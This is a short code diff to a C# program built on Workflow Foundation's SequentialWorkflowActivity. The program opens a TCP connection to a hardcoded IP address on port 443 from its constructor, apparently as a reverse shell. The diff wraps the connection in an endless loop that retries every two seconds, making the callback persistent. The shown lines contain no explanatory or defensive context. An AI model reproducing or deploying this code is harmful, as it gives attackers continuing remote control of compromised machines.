@@ -8,13 +8,18 @@ using System.Net.Sockets;
 using System.Workflow.Activities;
 
 
+using System.Threading;
+
 	public class Program : SequentialWorkflowActivity
 	{
 		static StreamWriter streamWriter;
 
 		public Program()
 		{
-	
+		while(true)
+		{
+			Thread.Sleep(2000);
+			
 			using(TcpClient client = new TcpClient("172.26.20.135", 443))
 			{
 				using(Stream stream = client.GetStream())
@@ -44,6 +49,7 @@ using System.Workflow.Activities;
 						}
 					}
 				}
+			}
 			}
 		}
 
